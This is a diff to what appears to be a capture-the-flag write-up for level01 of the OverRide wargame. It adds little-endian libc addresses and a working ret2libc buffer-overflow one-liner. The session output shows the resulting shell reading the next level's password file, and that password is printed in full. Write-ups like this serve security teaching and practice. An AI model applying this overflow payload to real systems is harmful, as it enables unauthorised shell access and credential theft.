@@ -16,4 +16,27 @@ Different addresses needed for the exploit:
 
 We need to convert all the addresses to little endian. 
 
-`\xf7\xe6\xae\xd0` `\x70\xeb\xe5\xf7` `\xec\x97\xf8\xf7`
+- `0xf7e6aed0` -> `\xd0\xae\xe6\xf7`
+- `0xf7e5eb70` -> `\x70\xeb\xe5\xf7`
+- `0xf7f897ec` -> `\xec\x97\xf8\xf7`
+
+
+Now, we can write the exploit:
+
+```bash
+(python -c 'print("dat_wil\n" + "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level01
+```
+
+```bash
+level01@OverRide:~$ (python -c 'print("dat_wil\n" + "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
